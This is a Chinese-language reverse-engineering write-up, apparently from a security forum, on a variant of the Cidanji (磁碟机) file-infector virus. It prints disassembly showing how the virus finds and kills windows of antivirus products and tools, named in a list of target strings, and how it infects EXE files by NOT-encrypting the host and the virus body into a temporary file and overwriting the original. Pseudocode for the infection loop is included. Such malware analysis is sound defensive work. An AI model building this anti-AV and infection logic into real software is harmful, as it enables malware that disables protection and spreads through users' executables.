@@ -1,0 +1,430 @@
+
+# 磁碟机病毒（`com\lsass.exe`、`smss.exe`、`dnsq.dll`）新变种之 anti 方式及感染 EXE 文件方式跟踪
+
+> 原文：[`www.pediy.com/kssd/pediy10/61461.html`](https://www.pediy.com/kssd/pediy10/61461.html)
+
+## 1 anti 杀软、专杀、常用工具
+
+### 1）查找每个窗口的子窗口，是否包含“病毒”，“杀毒”，“江民”字符特征。
+
+```
+004035CF   |.  8B35 08944000  MOV ESI,DWORD PTR DS:[<&USER32.GetWindow>]                ;  USER32.GetWindow
+004035D5   |.  8365 FC 00    AND DWORD PTR SS:[EBP-4],0
+004035D9   |.  6A 05         PUSH 5                                                     ; /Relation = GW_CHILD
+004035DB   |.  50           PUSH EAX                                                   ; |hWnd
+004035DC   |.  8945 08      MOV DWORD PTR SS:[EBP+8],EAX                               ; |
+004035DF   |.  FFD6         CALL ESI                                                   ; \GetWindow
+004035E1   |.  6A 02        PUSH 2
+004035E3   |.  50           PUSH EAX
+004035E4   |>  FFD6        /CALL ESI
+004035E6   |.  8BF8        |MOV EDI,EAX
+004035E8   |.  85FF        |TEST EDI,EDI
+004035EA   |.  76 66       |JBE SHORT lsass_3_.00403652
+004035EC   |.  8D85 08FCFFFF |LEA EAX,DWORD PTR SS:[EBP-3F8]
+004035F2   |.  68 E8030000 |PUSH 3E8                                                     ; /Count = 3E8 (1000.)
+004035F7   |.  50         |PUSH EAX                                                   ; |Buffer
+004035F8   |.  57         |PUSH EDI                                                   ; |hWnd
+004035F9   |.  FF15 0C944000 |CALL DWORD PTR DS:[<&USER32.GetWindowTextA>]              ; \GetWindowTextA
+004035FF   |.  8D85 08FCFFFF |LEA EAX,DWORD PTR SS:[EBP-3F8]
+00403605   |.  8D4D F0     |LEA ECX,DWORD PTR SS:[EBP-10]
+00403608   |.  50         |PUSH EAX
+00403609   |.  E8 12480000 |CALL <JMP.&MFC42.#860_??4CString@@QAEABV0@PBD@Z>
+0040360E   |.  68 38C54000 |PUSH lsass_3_.0040C538                                     ;  病毒
+00403613   |.  8D4D F0     |LEA ECX,DWORD PTR SS:[EBP-10]
+00403616   |.  E8 11480000 |CALL <JMP.&MFC42.#2764_?Find@CString@@QBEHPBD@Z>
+0040361B   |.  83F8 FF     |CMP EAX,-1
+0040361E   |.  75 29       |JNZ SHORT lsass_3_.00403649
+00403620   |.  68 30C54000 |PUSH lsass_3_.0040C530                                     ;  杀毒
+00403625   |.  8D4D F0     |LEA ECX,DWORD PTR SS:[EBP-10]
+00403628   |.  E8 FF470000 |CALL <JMP.&MFC42.#2764_?Find@CString@@QBEHPBD@Z>
+0040362D   |.  83F8 FF     |CMP EAX,-1
+00403630   |.  75 17       |JNZ SHORT lsass_3_.00403649
+00403632   |.  68 28C54000 |PUSH lsass_3_.0040C528                                     ;  江民
+00403637   |.  8D4D F0     |LEA ECX,DWORD PTR SS:[EBP-10]
+0040363A   |.  E8 ED470000 |CALL <JMP.&MFC42.#2764_?Find@CString@@QBEHPBD@Z>
+0040363F   |.  83F8 FF     |CMP EAX,-1
+00403642   |.  75 05       |JNZ SHORT lsass_3_.00403649
+00403644   |.  6A 02       |PUSH 2
+00403646   |.  57         |PUSH EDI
+00403647   |.^ EB 9B      \JMP SHORT lsass_3_.004035E4
+00403649   |> \FF75 08    PUSH DWORD PTR SS:[EBP+8]
+0040364C   |.  E8 25FFFFFF CALL lsass_3_.00403576                  ;  关闭窗口函数
+lsass_3_.00403576:
+
+00403576   /$  53         PUSH EBX
+00403577   |.  8B5C24 08  MOV EBX,DWORD PTR SS:[ESP+8]
+0040357B   |.  55         PUSH EBP
+0040357C   |.  56         PUSH ESI
+0040357D   |.  8B35 10944000 MOV ESI,DWORD PTR DS:[<&USER32.PostMessageA>]           ;  USER32.PostMessageA
+00403583   |.  33ED       XOR EBP,EBP
+00403585   |.  57         PUSH EDI
+00403586   |.  55         PUSH EBP                                                   ; /lParam => 0
+00403587   |.  55         PUSH EBP                                                   ; |wParam => 0
+00403588   |.  6A 11      PUSH 11                                                    ; |Message = WM_QUERYENDSESSION
+0040358A   |.  53         PUSH EBX                                                   ; |hWnd
+0040358B   |.  FFD6       CALL ESI                                                   ; \PostMessageA
+0040358D   |.  55         PUSH EBP                                                   ; /lParam => 0
+0040358E   |.  6A 01      PUSH 1                                                     ; |wParam = 1
+00403590   |.  6A 16      PUSH 16                                                    ; |Message = WM_ENDSESSION
+00403592   |.  53         PUSH EBX                                                   ; |hWnd
+00403593   |.  FFD6       CALL ESI                                                   ; \PostMessageA
+00403595   |.  55         PUSH EBP                                                   ; /lParam => 0
+00403596   |.  55         PUSH EBP                                                   ; |wParam => 0
+00403597   |.  6A 02      PUSH 2                                                     ; |Message = WM_DESTROY
+00403599   |.  53         PUSH EBX                                                   ; |hWnd
+0040359A   |.  FFD6       CALL ESI                                                   ; \PostMessageA
+0040359C   |.  33FF       XOR EDI,EDI
+0040359E   |>  55       /PUSH EBP
+0040359F   |.  55       |PUSH EBP
+004035A0   |.  57       |PUSH EDI
+004035A1   |.  53       |PUSH EBX
+004035A2   |.  FFD6     |CALL ESI             ;  发送 0-499 消息到窗口
+004035A4   |.  47       |INC EDI
+004035A5   |.  81FF F4010000 |CMP EDI,1F4
+004035AB   |.^ 7C F1    \JL SHORT lsass_3_.0040359E
+004035AD   |.  5F       POP EDI
+004035AE   |.  5E       POP ESI
+004035AF   |.  5D       POP EBP
+004035B0   |.  5B       POP EBX
+004035B1   \.  C3       RETN
+```
+
+### 2）根据窗口类型查找窗口标题是否包含以下字符串，如果包含则关闭窗口：
+
+```
+360 安全
+lsass.exe
+pagefile.pif
+磁碟机
+xorer
+dummycom
+diskgendummycom
+firewall
+dr.web
+escan
+mcagentescan
+ystmcagentescan
+kv
+monitoronit
+诊
+具
+ewido
+avg
+arpavg
+bitdefenderewido
+```
+
+```
+004036BC   |.  56         PUSH ESI                                                   ; /Count => 3E8 (1000.)
+004036BD   |.  50         PUSH EAX                                                   ; |Buffer
+004036BE   |.  FF75 08    PUSH DWORD PTR SS:[EBP+8]                                 ; |hWnd
+004036C1   |.  FF15 FC934000 CALL DWORD PTR DS:[<&USER32.GetClassNameA>]          ; \GetClassNameA
+004036C7   |.  8D85 FCFBFFFF LEA EAX,DWORD PTR SS:[EBP-404]
+004036CD   |.  8D4D EC    LEA ECX,DWORD PTR SS:[EBP-14]
+004036D0   |.  50         PUSH EAX
+004036D1   |.  E8 4A470000 CALL <JMP.&MFC42.#860_??4CString@@QAEABV0@PBD@Z>
+004036D6   |.  8D85 FCFBFFFF LEA EAX,DWORD PTR SS:[EBP-404]
+004036DC   |.  56         PUSH ESI                                                   ; /Count
+004036DD   |.  50         PUSH EAX                                                   ; |Buffer
+004036DE   |.  FF75 08    PUSH DWORD PTR SS:[EBP+8]                                 ; |hWnd
+004036E1   |.  FF15 0C944000 CALL DWORD PTR DS:[<&USER32.GetWindowTextA>]          ; \GetWindowTextA
+...
+00403725   |.  68 48C74000 PUSH lsass_3_.0040C748                                   ;  360 安全
+0040372A   |.  8D4D F0    LEA ECX,DWORD PTR SS:[EBP-10]
+0040372D   |.  E8 FA460000 CALL <JMP.&MFC42.#2764_?Find@CString@@QBEHPBD@Z>
+00403732   |.  83CB FF    OR EBX,FFFFFFFF
+00403735   |.  3BC3       CMP EAX,EBX
+00403737   |.  0F85 20050000 JNZ lsass_3_.00403C5D
+0040373D   |.  68 3CC74000 PUSH lsass_3_.0040C73C                                   ;  lsass.exe
+00403742   |.  8D4D F0    LEA ECX,DWORD PTR SS:[EBP-10]
+00403745   |.  E8 E2460000 CALL <JMP.&MFC42.#2764_?Find@CString@@QBEHPBD@Z>
+0040374A   |.  3BC3       CMP EAX,EBX
+0040374C   |.  0F85 0B050000 JNZ lsass_3_.00403C5D
+00403752   |.  68 30C74000 PUSH lsass_3_.0040C730                                   ;  smss.exe
+```
+
+
+
+```
+00403757  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]  
+
+0040375A  |.  E8 CD460000   CALL <JMP.&MFC42.#2764_?Find@CString@@QBEHPBD@Z>  
+
+0040375F  |.  3BC3          CMP EAX,EBX  
+
+00403761  |.  0F85 F6040000 JNZ lsass_3_.00403C5D  
+
+00403767  |.  68 20C74000   PUSH lsass_3_.0040C720                                ;  pagefile.pif  
+
+0040376C  |.  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-10]  
+
+0040376F  |.  E8 B8460000   CALL <JMP.&MFC42.#2764_?Find@CString@@QBEHPBD@Z>  
+
+00403774  |.  3BC3          CMP EAX,EBX  
+
+00403776  |.  0F85 E1040000 JNZ lsass_3_.00403C5D  
+
+0040377C  |.  68 18C74000   PUSH lsass_3_.0040C718                                ;  磁碟机  
+
+...  
+
+00403C5F  |> \FF75 08       PUSH DWORD PTR SS:[EBP+8]  
+
+00403C62  |.  E8 0FF9FFFF   CALL lsass_3_.00403576  
+```
+
+### 2 感染 Exe 文件解析
+
+#### 1）计算加密段大小 (存入 `40C040`)
+
+```
+004054BA   .  8105 40C04000> ADD DWORD PTR DS:[40C040],0EC  
+
+004054C4   .  8B86 490A0000 MOV EAX,DWORD PTR DS:[ESI+A49]  
+
+004054CA   .  8B0D 40C04000 MOV ECX,DWORD PTR DS:[40C040]  
+
+004054D0   .  68 30CA4000   PUSH lsass.0040CA30                                     ;  ASCII ".exe"  
+
+004054D5   .  8B40 F8       MOV EAX,DWORD PTR DS:[EAX-8]  
+
+004054D8   .  8D4401 04     LEA EAX,DWORD PTR DS:[ECX+EAX+4]  
+
+004054DC   .  8D4D D4       LEA ECX,DWORD PTR SS:[EBP-2C]  
+
+004054DF   .  A3 40C04000   MOV DWORD PTR DS:[40C040],EAX  
+```
+
+#### 2）感染算法：
+
+a）生成病毒体临时文件 `~.exe`
+
+b）将原程序加密并追加到临时文件 `~.exe` 中：
+
+```
+00406C64  |.  FF35 4CC04000 PUSH DWORD PTR DS:[40C04C]                    ;   g_dwVFileSize  
+
+00406C6A  |.  6A 01         PUSH 1  
+
+00406C6C  |.  FFB6 300A0000 PUSH DWORD PTR DS:[ESI+A30]  
+
+00406C72  |.  FFD3          CALL EBX                                      ;  fread  
+
+00406C74  |.  83C4 10       ADD ESP,10  
+
+00406C77  |>   8BF8          /MOV EDI,EAX  
+
+00406C79  |.  85FF          |TEST EDI,EDI  
+
+00406C7B  |.  0F84 90000000 |JE lsass.00406D11  
+
+00406C81  |.  807D F3 00    |CMP BYTE PTR SS:[EBP-D],0  
+
+00406C85  |.  74 49         |JE SHORT lsass.00406CD0  
+
+00406C87  |.  33C0          |XOR EAX,EAX  
+
+00406C89  |.  3905 4CC04000 |CMP DWORD PTR DS:[40C04C],EAX  
+
+00406C8F  |.  7E 18         |JLE SHORT lsass.00406CA9  
+
+00406C91  |>   8B8E 300A0000 |/MOV ECX,DWORD PTR DS:[ESI+A30]  
+
+00406C97  |.  03C8          ||ADD ECX,EAX  
+
+00406C99  |.  40            ||INC EAX  
+
+00406C9A  |.  40            ||INC EAX  
+
+00406C9B  |.  8A11          ||MOV DL,BYTE PTR DS:[ECX]  
+
+00406C9D  |.  F6D2          ||NOT DL  
+
+00406C9F  |.  8811          ||MOV BYTE PTR DS:[ECX],DL  
+
+00406CA1  |.  3B05 4CC04000 ||CMP EAX,DWORD PTR DS:[40C04C]  
+
+00406CA7  |.^ 7C E8         |\JL SHORT lsass.00406C91  
+
+00406CA9  |>   A1 40C04000   |MOV EAX,DWORD PTR DS:[40C040]  
+
+00406CAE  |.  83C0 09       |ADD EAX,9  
+
+00406CB1  |>   3B05 4CC04000 |/CMP EAX,DWORD PTR DS:[40C04C]  
+
+00406CB7  |.  7D 13         ||JGE SHORT lsass.00406CCC  
+
+00406CB9  |.  8B8E 300A0000 ||MOV ECX,DWORD PTR DS:[ESI+A30]  
+
+00406CBF  |.  03C8          ||ADD ECX,EAX  
+
+00406CC1  |.  83C0 0D       ||ADD EAX,0D  
+
+00406CC4  |.  8A11          ||MOV DL,BYTE PTR DS:[ECX]  
+
+00406CC6  |.  F6D2          ||NOT DL  
+
+00406CC8  |.  8811          ||MOV BYTE PTR DS:[ECX],DL  
+
+00406CCA  |.^ EB E5         |\JMP SHORT lsass.00406CB1  
+
+00406CCC  |>   8065 F3 00    |AND BYTE PTR SS:[EBP-D],0  
+
+00406CD0  |>   8B4D E4       |MOV ECX,DWORD PTR SS:[EBP-1C]  
+
+00406CD3  |.  8B46 60       |MOV EAX,DWORD PTR DS:[ESI+60]  
+
+00406CD6  |.  8D1439        |LEA EDX,DWORD PTR DS:[ECX+EDI]  
+
+00406CD9  |.  3BD0          |CMP EDX,EAX  
+
+00406CDB  |.  7E 04         |JLE SHORT lsass.00406CE1  
+
+00406CDD  |.  2BC1          |SUB EAX,ECX  
+
+00406CDF  |.  8BF8          |MOV EDI,EAX  
+
+00406CE1  |>   FF75 E0       |PUSH DWORD PTR SS:[EBP-20]                   ; /stream  
+
+00406CE4  |.  57            |PUSH EDI                                      ; |n  
+
+00406CE5  |.  6A 01         |PUSH 1                                        ; |size = 1  
+
+00406CE7  |.  FFB6 300A0000 |PUSH DWORD PTR DS:[ESI+A30]                   ; |ptr  
+
+00406CED  |.  FF15 2C934000 |CALL DWORD PTR DS:[<&MSVCRT.fwrite>]         ; \fwrite  
+
+00406CF3  |.  FF75 EC       |PUSH DWORD PTR SS:[EBP-14]  
+
+00406CF6  |.  0145 E4       |ADD DWORD PTR SS:[EBP-1C],EAX  
+
+00406CF9  |.  FF35 4CC04000 |PUSH DWORD PTR DS:[40C04C]  
+
+00406CFF  |.  6A 01         |PUSH 1  
+
+00406D01  |.  FFB6 300A0000 |PUSH DWORD PTR DS:[ESI+A30]  
+
+00406D07  |.  FFD3          |CALL EBX  
+
+00406D09  |.  83C4 20       |ADD ESP,20  
+
+00406D0C  |.^ E9 66FFFFFF   \JMP lsass.00406C77  
+```
+
+```c
+while (fread(g_dwNeedFilePos, /*pBuf*/ 1, g_dwVFileSize, file)) 
+{ 
+  if (!bInfect) break; 
+  ECX = 0; 
+  dwTmp = ECX; 
+  if g_dwVFileSize <= ECX 
+    goto aa; 
+  do 
+  { 
+    EDX = g_dwNeedFilePos; 
+    ECX += EDX; 
+    byte tmp = Get[ECX]; 
+    not tmp; 
+    Set [ECX], tmp; 
+    ECX = dwTmp; 
+    ECX += 2; 
+    if (ECX >= g_dwVFileSize) 
+      break; 
+  } while (1) 
+  ECX = dwStart; 
+  ECX += 0x09; 
+  while (1) 
+  { 
+    dwTmp = ECX; 
+    if ECX > g_dwVFileSize 
+      break; 
+    EDX = g_dwNeedFilePos; 
+    ECX += EDX; 
+    byte tmp = Get [ECX]; 
+    not tmp; 
+    Set [ECX], tmp; 
+    ECX = dwTmp; 
+    ECX += 0x0D; 
+  } 
+aa: 
+bInfect = FALSE; 
+}
+```
+
+c）再将病毒体加密并追加到临时文件 `~.exe` 中。
+
+```
+00406DFA  |.  FF35 4CC04000 PUSH DWORD PTR DS:[40C04C]  
+
+00406E00  |.  6A 01         PUSH 1  
+
+00406E02  |.  FFB6 300A0000 PUSH DWORD PTR DS:[ESI+A30]  
+
+00406E08  |.  FFD3          CALL EBX  
+
+00406E0A  |.  83C4 1C       ADD ESP,1C  
+
+00406E0D  |>   85C0          /TEST EAX,EAX  
+
+00406E0F  |.  74 64         |JE SHORT lsass.00406E75  
+
+00406E11  |.  807D F3 00    |CMP BYTE PTR SS:[EBP-D],0  
+
+00406E15  |.  74 31         |JE SHORT lsass.00406E48  
+
+00406E17  |.  8365 DC 00    |AND DWORD PTR SS:[EBP-24],0  
+
+00406E1B  |.  833D 4CC04000> |CMP DWORD PTR DS:[40C04C],0  
+
+00406E22  |.  7E 20         |JLE SHORT lsass.00406E44  
+
+00406E24  |>   8B8E 300A0000 |/MOV ECX,DWORD PTR DS:[ESI+A30]  
+
+00406E2A  |.  8B55 DC       ||MOV EDX,DWORD PTR SS:[EBP-24]  
+
+00406E2D  |.  8345 DC 02    ||ADD DWORD PTR SS:[EBP-24],2  
+
+00406E31  |.  03CA          ||ADD ECX,EDX  
+
+00406E33  |.  8A11          ||MOV DL,BYTE PTR DS:[ECX]  
+
+00406E35  |.  F6D2          ||NOT DL  
+
+00406E37  |.  8811          ||MOV BYTE PTR DS:[ECX],DL  
+
+00406E39  |.  8B4D DC       ||MOV ECX,DWORD PTR SS:[EBP-24]  
+
+00406E3C  |.  3B0D 4CC04000 ||CMP ECX,DWORD PTR DS:[40C04C]  
+
+00406E42  |.^ 7C E0         |\JL SHORT lsass.00406E24  
+
+00406E44  |>   8065 F3 00    |AND BYTE PTR SS:[EBP-D],0  
+
+00406E48  |>   FF75 E0       |PUSH DWORD PTR SS:[EBP-20]                   ; /stream  
+
+00406E4B  |.  50            |PUSH EAX                                      ; |n  
+
+00406E4C  |.  6A 01         |PUSH 1                                        ; |size = 1  
+
+00406E4E  |.  FFB6 300A0000 |PUSH DWORD PTR DS:[ESI+A30]                   ; |ptr  
+
+00406E54  |.  FF15 2C934000 |CALL DWORD PTR DS:[<&MSVCRT.fwrite>]         ; \fwrite  
+
+00406E5A  |.  FF75 EC       |PUSH DWORD PTR SS:[EBP-14]  
+
+00406E5D  |.  0145 E4       |ADD DWORD PTR SS:[EBP-1C],EAX  
+
+00406E60  |.  FF35 4CC04000 |PUSH DWORD PTR DS:[40C04C]  
+
+00406E66  |.  6A 01         |PUSH 1  
+
+00406E68  |.  FFB6 300A0000 |PUSH DWORD PTR DS:[ESI+A30]  
+
+00406E6E  |.  FFD3          |CALL EBX  
+
+00406E70  |.  83C4 20       |ADD ESP,20  
+
+00406E73  |.^ EB 98         \JMP SHORT lsass.00406E0D  
+```
+
+d）用临时文件覆盖原文件。
